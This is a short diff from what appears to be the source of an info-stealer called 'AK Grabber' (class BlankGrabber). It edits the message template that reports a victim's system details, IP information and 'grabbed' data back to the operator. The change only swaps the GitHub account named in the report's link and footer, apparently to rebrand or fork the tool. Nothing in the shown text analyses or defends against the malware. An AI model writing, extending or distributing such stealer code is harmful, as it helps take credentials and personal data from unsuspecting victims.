@@ -1685,10 +1685,10 @@ class BlankGrabber:
                         {
                             "title": "AK Grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/unknownchesspawn/AK-grabber",
+                            "url": "https://github.com/0x559/AK-grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by AK Grabber | https://github.com/unknownchesspawn/AK-grabber"
+                                "text": "Grabbed by AK Grabber | https://github.com/0x559/AK-grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
